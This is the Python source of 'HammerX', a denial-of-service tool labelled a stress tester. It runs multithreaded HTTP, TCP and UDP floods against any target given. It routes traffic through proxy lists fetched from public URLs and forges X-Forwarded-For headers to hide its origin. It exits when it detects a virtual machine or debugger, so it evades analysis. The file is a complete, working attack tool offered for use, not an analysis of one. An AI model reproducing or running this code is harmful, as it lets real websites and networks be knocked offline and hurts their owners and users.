import argparse
import random
import socket
import threading
import time
import os
import sys
import platform
import requests
import json
from queue import Queue
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn

console = Console()
proxies = Queue()
stats = {"sent": 0, "failed": 0}
stop_event = threading.Event()

BANNER = r'''
██╗░░██╗░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░██╗░░██╗
██║░░██║██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗╚██╗██╔╝
███████║███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝░╚███╔╝░
██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗░██╔██╗░
██║░░██║██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║██╔╝╚██╗
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝
HammerX - Advanced DDoS Stress Testing Tool
Author: KiNG_CYReX
Contact: Telegram/WhatsApp +989903390280
'''

def is_virtual_machine():
    indicators = ["vbox", "vmware", "qemu", "virtual", "hyperv"]
    sysinfo = platform.platform().lower() + platform.node().lower()
    return any(indicator in sysinfo for indicator in indicators)

def is_debugged():
    return sys.gettrace() is not None

def is_safe():
    return not is_virtual_machine() and not is_debugged()

def load_proxies():
    try:
        if os.path.exists("proxies.txt"):
            with open("proxies.txt") as f:
                for line in f:
                    proxy = line.strip()
                    if proxy:
                        proxies.put(proxy)
        else:
            urls = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
            ]
            for url in urls:
                r = requests.get(url)
                for line in r.text.strip().split('\n'):
                    proxy = line.strip()
                    if proxy:
                        proxies.put(proxy)
        console.log(f"[green]Loaded {proxies.qsize()} proxies")
    except Exception as e:
        console.log(f"[red]Failed to load proxies: {e}")

def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0", "Chrome/107.0", "Safari/537.36", "Opera/9.80"
        ]),
        "Referer": random.choice([
            "https://google.com", "https://bing.com", "https://yahoo.com"
        ]),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept-Encoding": "gzip, deflate, br"
    }

def http_attack(target, duration):
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        try:
            proxy = proxies.get() if not proxies.empty() else None
            if proxy:
                proxies.put(proxy)
                proxies_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                requests.get(target, headers=random_headers(), proxies=proxies_dict, timeout=5)
            else:
                requests.get(target, headers=random_headers(), timeout=5)
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def tcp_attack(ip, port, duration):
    end = time.time() + duration
    while time.time() < end and not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(os.urandom(1024))
            s.close()
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def udp_attack(ip, port, duration):
    end = time.time() + duration
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end and not stop_event.is_set():
        try:
            s.sendto(os.urandom(1024), (ip, port))
            stats["sent"] += 1
        except:
            stats["failed"] += 1

def reporter():
    with Progress(SpinnerColumn(), "[bold green]Running...", TimeElapsedColumn()) as progress:
        task = progress.add_task("ddos", total=None)
        while not stop_event.is_set():
            time.sleep(1)
        progress.stop()

def summary():
    table = Table(title="Attack Summary")
    table.add_column("Packets Sent", justify="right")
    table.add_column("Failed", justify="right")
    table.add_row(str(stats["sent"]), str(stats["failed"]))
    console.print(table)
    with open("attack_results.json", "w") as f:
        json.dump(stats, f, indent=2)

def main():
    print(BANNER)
    if not is_safe():
        console.log("[red]Stealth/Sandbox detected! Exiting...")
        return

    parser = argparse.ArgumentParser()
    parser.add_argument("mode", choices=["http", "tcp", "udp"], help="Attack type")
    parser.add_argument("target", help="Target IP or URL")
    parser.add_argument("--port", type=int, default=80, help="Target port (default=80)")
    parser.add_argument("--time", type=int, default=60, help="Duration in seconds")
    args = parser.parse_args()

    load_proxies()
    reporter_thread = threading.Thread(target=reporter)
    reporter_thread.start()

    attack_func = {
        "http": lambda: http_attack(args.target, args.time),
        "tcp": lambda: tcp_attack(args.target, args.port, args.time),
        "udp": lambda: udp_attack(args.target, args.port, args.time)
    }[args.mode]

    threads = []
    for _ in range(100):
        t = threading.Thread(target=attack_func)
        t.start()
        threads.append(t)

    time.sleep(args.time)
    stop_event.set()
    for t in threads:
        t.join()
    reporter_thread.join()
    summary()

if __name__ == "__main__":
    main()
